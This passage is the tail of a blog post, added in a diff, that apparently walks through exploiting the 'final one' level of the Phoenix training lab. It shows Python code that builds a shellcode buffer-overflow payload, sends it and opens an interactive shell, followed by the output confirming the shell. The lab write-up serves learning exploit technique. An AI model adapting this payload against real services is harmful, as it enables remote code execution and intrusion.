+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="p">(</span><span class="n">bufsize</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="o">+</span><span class="n">bufaddr</span>
+<span class="k">try</span> <span class="p">:</span>
+    <span class="n">exploited</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">exploited</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+
+<ul>
+<li>running this script we get :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>user@phoenix-amd64:~/finalone$<span class="w"> </span>python<span class="w"> </span>remotexploit.py<span class="w"> </span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
+$<span class="w"> </span>
+$<span class="w"> </span>whoami
+phoenix-i386-final-one
+</code></pre></div>
+
+<h1>epilogue</h1>
+<ul>
+<li>we did it guys ! , and we did it super cool .</li>
+</ul>
+        </div>
+      </main>
+    </div>
+  </body>
+      
+    <footer>
+
+      <div class="contactme bar_item">
+        <a class="button" href="https://x.com/execius"><i class="fa-brands fa-x-twitter fa-2x"></i></a> 
+      </div>
+    </footer>
+
+</html> 
+
